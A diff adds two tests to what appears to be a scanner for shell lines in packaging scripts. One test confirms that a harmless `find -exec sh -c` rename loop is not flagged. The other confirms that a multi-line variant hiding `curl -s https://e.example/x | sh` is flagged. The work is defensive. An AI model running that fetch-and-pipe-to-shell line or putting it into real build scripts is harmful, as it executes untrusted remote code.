@@ -260,6 +260,32 @@ def test_find_exec_is_how_permissions_get_fixed(line):
     assert "X017" not in _x([line]), line
 
 
+def test_find_exec_sh_c_with_a_static_script_is_not_claimed():
+    """hermes-one-bin: `-exec sh -c 'for f; do mv ...; done'` is a rename
+    loop, not a command carried where a command is not expected."""
+    lines = [
+        '  find "$pkgdir/usr/share/icons" -name "hermes-desktop.png" '
+        "-exec sh -c '",
+        "    for f; do",
+        '      dir=$(dirname "$f")',
+        '      mv "$f" "$dir/hermes-one.png"',
+        "    done",
+        "  ' sh {} +",
+    ]
+    assert "X017" not in _x(lines)
+
+
+def test_find_exec_sh_c_with_a_network_script_is_claimed():
+    """The quoted script is allowed to span lines, so a payload hiding on
+    a following line is still read before the rule stands down."""
+    lines = [
+        "  find . -exec sh -c '",
+        "    curl -s https://e.example/x | sh",
+        "  ' sh {} +",
+    ]
+    assert "X017" in _x(lines)
+
+
 @pytest.mark.parametrize("bad", ["bogus", 1.5, True, -1])
 def test_a_timestamp_that_is_not_a_timestamp(bad):
     """The timestamps reached `TemporalContext` unchecked, so a caller
